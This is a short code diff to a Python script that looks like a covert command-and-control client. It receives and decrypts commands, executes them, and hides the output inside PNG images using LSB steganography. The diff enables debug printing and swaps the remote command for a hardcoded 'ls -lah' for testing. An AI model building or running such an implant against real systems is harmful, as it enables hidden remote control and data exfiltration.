@@ -40,8 +40,8 @@ def mod_img(msg):
     encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
     encoded_img.save(f"{path}{file_name}-final.png")
     #Error Checking: 
-    #print("[*] Revealed from image:")
-    #print(lsb.reveal(f"{path}{file_name}-final.png"))
+    print("[*] Revealed from image:")
+    print(lsb.reveal(f"{path}{file_name}-final.png"))
     return f"{path}{file_name}-final.png" 
 
 #Execute command 
@@ -113,7 +113,7 @@ if __name__ == '__main__':
             encrypted_cmd = parse_json(response) 
             cipher_text = encrypt("Testing testing 123~")
             cmd = decrypt(cipher_text) 
-            cmd = encrypted_cmd
+            cmd = "ls -lah"
             output = exec(cmd) 
             if output != "": 
                 obf_img = mod_img(output)
